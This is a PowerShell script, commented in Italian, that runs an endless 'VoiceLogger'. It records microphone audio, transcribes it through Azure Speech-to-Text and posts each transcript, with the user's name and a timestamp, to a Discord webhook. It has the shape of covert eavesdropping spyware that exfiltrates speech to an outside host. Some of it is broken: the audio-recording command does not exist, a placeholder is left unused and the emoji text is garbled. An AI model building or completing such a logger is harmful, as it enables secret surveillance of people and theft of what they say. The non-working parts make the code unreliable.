# Funzione per caricare il testo su Discord
function DC-Upload {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$true)]
        [string]$text
    )

    # URL del Webhook Discord
    $dc = 'https://discord.com/api/webhooks/your-webhook-url'

    if (-not [string]::IsNullOrWhiteSpace($text)) {
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        $username = $env:USERNAME

        $body = @{
            username = "VoiceLogger"
            content = "**üó£ Nuova frase registrata**`nüë§ Utente: $username`nüïí Ora: $timestamp`nüìÑ Testo: $text"
        } | ConvertTo-Json -Depth 3

        try {
            Invoke-RestMethod -Uri $dc -Method Post -Body $body -ContentType 'application/json'
            Write-Host "‚úÖ Inviato a Discord"
        } catch {
            Write-Host "‚ùå Errore durante l'invio a Discord: $_"
        }
    }
}

# Funzione per il riconoscimento vocale usando Azure Speech-to-Text
function voiceLogger {
    param (
        [string]$subscriptionKey = 'YOUR_AZURE_SPEECH_KEY',   # La tua chiave API Azure
        [string]$region = 'YOUR_AZURE_REGION'                 # La regione del tuo servizio Azure
    )

    # URL per la richiesta del servizio Azure Speech-to-Text
    $uri = "https://$region.stt.speech.microsoft.com/speech/recognition/conversation/cognitiveservices/v1?language=it-IT"

    # Crea l'header di autenticazione
    $headers = @{
        'Ocp-Apim-Subscription-Key' = $subscriptionKey
        'Content-Type' = 'audio/wav'
    }

    Write-Host "üé§ VoiceLogger attivo. Pronuncia qualcosa in italiano..."

    # Acquisisce l'audio dal microfono e lo invia a Azure per il riconoscimento vocale
    $audioDevice = [System.IO.Stream]::Null  # Placeholder per l'input audio
    $audioFilePath = 'C:\temp\audio.wav'  # File temporaneo per il salvataggio dell'audio

    while ($true) {
        try {
            # Registra l'audio (puoi usare software come Audacity per registrare e salvare)
            Start-Process 'powershell' -ArgumentList "Record-Audio $audioFilePath" -NoNewWindow -Wait
            
            # Leggi il file audio e invialo a Azure Speech
            $audioContent = [System.IO.File]::ReadAllBytes($audioFilePath)
            $response = Invoke-RestMethod -Uri $uri -Headers $headers -Method Post -Body $audioContent

            if ($response.DisplayText) {
                $text = $response.DisplayText
                Write-Host "üìù Testo riconosciuto: $text"

                # Invia il testo riconosciuto a Discord
                DC-Upload -text $text
            }

        } catch {
            Write-Host "‚ö†Ô∏è Errore nel riconoscimento vocale: $_"
        }

        Start-Sleep -Seconds 1  # Delay tra i tentativi
    }

    Write-Host "üõë VoiceLogger terminato."
}

# Avvia il logger vocale
voiceLogger -subscriptionKey 'YOUR_AZURE_SPEECH_KEY' -region 'YOUR_AZURE_REGION'
